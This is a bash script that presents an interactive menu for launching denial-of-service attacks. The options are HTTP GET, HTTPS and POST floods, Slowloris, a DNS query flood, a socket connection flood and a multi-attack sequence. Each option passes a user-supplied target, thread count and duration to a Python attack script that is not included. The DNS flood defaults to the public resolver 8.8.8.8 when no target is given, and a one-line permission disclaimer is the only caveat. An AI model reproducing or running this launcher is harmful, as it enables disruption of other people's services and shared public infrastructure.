#!/bin/bash

# Quick No-Root Attack Script
# ===========================

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║            Quick WiFi Attack Launcher - No Root             ║"
echo "║                                                              ║"
echo "║  ✅ NO ROOT REQUIRED - USER MODE ATTACKS ✅                 ║"
echo "║  Only use on networks you own or have permission to test    ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo

# Function to show menu
show_menu() {
    echo "🚀 NO-ROOT ATTACK MENU:"
    echo "======================="
    echo "1. 🌐 HTTP GET Flood Attack"
    echo "2. 🔒 HTTPS Flood Attack"
    echo "3. 📝 HTTP POST Flood Attack"
    echo "4. 🐌 Slowloris Attack"
    echo "5. 📡 DNS Query Flood"
    echo "6. 🔌 Socket Connection Flood"
    echo "7. 📶 WiFi Scanning Attack"
    echo "8. 🎯 Multi-Attack Sequence"
    echo "9. 🎮 Interactive GUI"
    echo "10. 🔍 Discover Network Targets"
    echo "11. ❌ Exit"
    echo
}

# Function to get target
get_target() {
    read -p "[?] Enter target URL/IP: " TARGET
    if [[ -z "$TARGET" ]]; then
        echo "[!] Target required!"
        exit 1
    fi
}

# Main menu loop
while true; do
    show_menu
    read -p "[?] Select option (1-11): " choice
    
    case $choice in
        1)
            echo "[🌐 HTTP GET FLOOD ATTACK]"
            get_target
            read -p "[?] Number of threads (default 50): " threads
            threads=${threads:-50}
            read -p "[?] Duration in seconds (default 60): " duration
            duration=${duration:-60}
            
            echo "[*] Starting HTTP GET flood attack..."
            python3 wifi_noroot_tester.py --http-flood -t "$TARGET" --threads "$threads" --duration "$duration"
            ;;
        2)
            echo "[🔒 HTTPS FLOOD ATTACK]"
            get_target
            read -p "[?] Number of threads (default 30): " threads
            threads=${threads:-30}
            read -p "[?] Duration in seconds (default 60): " duration
            duration=${duration:-60}
            
            echo "[*] Starting HTTPS flood attack..."
            python3 wifi_noroot_tester.py --https-flood -t "$TARGET" --threads "$threads" --duration "$duration"
            ;;
        3)
            echo "[📝 HTTP POST FLOOD ATTACK]"
            get_target
            read -p "[?] Number of threads (default 40): " threads
            threads=${threads:-40}
            read -p "[?] Duration in seconds (default 60): " duration
            duration=${duration:-60}
            
            echo "[*] Starting HTTP POST flood attack..."
            python3 wifi_noroot_tester.py --post-flood -t "$TARGET" --threads "$threads" --duration "$duration"
            ;;
        4)
            echo "[🐌 SLOWLORIS ATTACK]"
            read -p "[?] Target host/IP: " host
            if [[ -z "$host" ]]; then
                echo "[!] Host required!"
                continue
            fi
            read -p "[?] Target port (default 80): " port
            port=${port:-80}
            read -p "[?] Number of connections (default 200): " connections
            connections=${connections:-200}
            read -p "[?] Duration in seconds (default 300): " duration
            duration=${duration:-300}
            
            echo "[*] Starting Slowloris attack..."
            python3 wifi_noroot_tester.py --slowloris -t "$host" -p "$port" --threads "$connections" --duration "$duration"
            ;;
        5)
            echo "[📡 DNS QUERY FLOOD]"
            read -p "[?] DNS server IP (default: auto-discover): " dns_server
            if [[ -z "$dns_server" ]]; then
                echo "[*] Will auto-discover DNS servers..."
                python3 wifi_noroot_tester.py --discover
                read -p "[?] Enter DNS server IP from above: " dns_server
            fi
            
            if [[ -z "$dns_server" ]]; then
                dns_server="8.8.8.8"
                echo "[*] Using default DNS: $dns_server"
            fi
            
            read -p "[?] Number of threads (default 30): " threads
            threads=${threads:-30}
            read -p "[?] Duration in seconds (default 60): " duration
            duration=${duration:-60}
            
            echo "[*] Starting DNS query flood..."
            python3 wifi_noroot_tester.py --dns-flood -t "$dns_server" --threads "$threads" --duration "$duration"
            ;;
        6)
            echo "[🔌 SOCKET CONNECTION FLOOD]"
            read -p "[?] Target host/IP: " host
            if [[ -z "$host" ]]; then
                echo "[!] Host required!"
                continue
            fi
            read -p "[?] Target port (default 80): " port
            port=${port:-80}
            read -p "[?] Number of threads (default 100): " threads
            threads=${threads:-100}
            read -p "[?] Duration in seconds (default 60): " duration
            duration=${duration:-60}
            
            echo "[*] Starting socket connection flood..."
            python3 wifi_noroot_tester.py --socket-flood -t "$host" -p "$port" --threads "$threads" --duration "$duration"
            ;;
        7)
            echo "[📶 WiFi SCANNING ATTACK]"
            read -p "[?] Duration in seconds (default 120): " duration
            duration=${duration:-120}
            
            echo "[*] Starting WiFi scanning attack..."
            echo "[*] This will perform continuous WiFi scans"
            python3 wifi_noroot_tester.py --wifi-scan --duration "$duration"
            ;;
        8)
            echo "[🎯 MULTI-ATTACK SEQUENCE]"
            read -p "[?] Attack duration in seconds (default 90): " duration
            duration=${duration:-90}
            
            echo "[*] Starting multi-attack sequence..."
            echo "[*] This will discover targets and launch multiple attacks"
            python3 wifi_noroot_tester.py --multi-attack --duration "$duration"
            ;;
        9)
            echo "[🎮 LAUNCHING NO-ROOT GUI]"
            python3 noroot_gui.py
            ;;
        10)
            echo "[🔍 DISCOVERING NETWORK TARGETS]"
            python3 wifi_noroot_tester.py --discover
            ;;
        11)
            echo "[+] Goodbye!"
            exit 0
            ;;
        *)
            echo "[!] Invalid option!"
            ;;
    esac
    
    echo
    read -p "[*] Press Enter to return to menu..."
done